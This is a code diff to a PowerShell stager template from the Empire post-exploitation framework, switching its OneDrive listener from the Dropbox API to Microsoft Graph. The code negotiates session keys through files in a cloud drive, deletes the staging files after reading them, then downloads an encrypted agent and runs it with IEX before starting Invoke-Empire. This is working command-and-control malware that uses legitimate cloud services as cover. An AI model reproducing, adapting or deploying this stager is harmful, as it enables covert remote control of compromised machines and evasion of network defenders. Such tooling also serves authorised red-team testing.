@@ -1,3 +1,14 @@
+#################################################################
+# This file is a Jinja2 template.
+#    Variables:
+#        working_hours
+#        kill_date
+#        staging_key
+#        profile
+#################################################################
+
+{% include 'onedrive/comms.ps1' %}
+
 function Start-Negotiate {
     param($T,$SK,$PI=5,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
 
@@ -92,9 +103,9 @@ function Start-Negotiate {
     }
 
     if ($Script:Proxy) {
-        $wc.Proxy = $Script:Proxy;   
+        $wc.Proxy = $Script:Proxy;
     }
-    
+
     # RC4 routing packet:
     #   sessionID = $ID
     #   language = POWERSHELL (1)
@@ -108,20 +119,23 @@ function Start-Negotiate {
 
     # the User-Agent always resets for multiple calls...silly
     $wc.Headers.Set("User-Agent",$UA);
-    # add Dropbox specific args
     $wc.Headers.Set("Authorization", "Bearer $T");
     $wc.Headers.Set("Content-Type", "application/octet-stream");
-    # have to remove before adding a new value
-    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_1.txt`"}");
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
-    $Null = $wc.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $rc4p);
+    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_1.txt:/content", "put", $rc4p);
 
     # step 4 of negotiation -> server returns RSA(nonce+AESsession))
     Start-Sleep -Seconds $(($PI -as [Int])*2);
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
-    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_2.txt`"}");
-    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");
+    Do{try{
+    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_2.txt:/content");
+    }catch{Start-Sleep -Seconds $(($PI -as [Int])*2)}}While($raw -eq $null);
+
+    $wc.Headers.Set("User-Agent",$UA);
+    $wc.Headers.Set("Authorization", "Bearer $T");
+    $null=$wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_2.txt", "DELETE", "");
+
     $de=$e.GetString($rs.decrypt($raw,$false));
     # packet = server nonce + AES session key
     $nonce=$de[0..15] -join '';
@@ -181,16 +195,17 @@ function Start-Negotiate {
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
     $wc.Headers.Set("Content-Type", "application/octet-stream");
-    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_3.txt`"}");
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $Null = $wc.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $rc4p2);
+    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_3.txt:/content", "PUT", $rc4p2);
 
     Start-Sleep -Seconds $(($PI -as [Int])*2);
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
-    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_4.txt`"}");
-    $raw=$wc.DownloadData("https://content.dropboxapi.com/2/files/download");
+    $raw=$null;
+    do{try{
+    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_4.txt:/content");
+    }catch{Start-Sleep -Seconds $(($PI -as [Int])*2)}}While($raw -eq $null);
 
     Start-Sleep -Seconds $($PI -as [Int]);
     $wc2=New-Object System.Net.WebClient;
@@ -199,11 +214,11 @@ function Start-Negotiate {
     if($Script:Proxy) {
         $wc2.Proxy = $Script:Proxy;
     }
-    
+
     $wc2.Headers.Add("User-Agent",$UA);
     $wc2.Headers.Add("Authorization", "Bearer $T");
     $wc2.Headers.Add("Content-Type", " application/json");
-    $Null=$wc2.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"REPLACE_STAGING_FOLDER/$($ID)_4.txt`"}");
+    $Null=$wc2.UploadString("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_4.txt", "DELETE", "");
 
     # decrypt the agent and register the agent logic
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
@@ -213,7 +228,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -ProxySettings $Script:Proxy;
+    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "REPLACE_WORKING_HOURS" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -T $T -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
+Start-Negotiate -T "REPLACE_TOKEN" -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
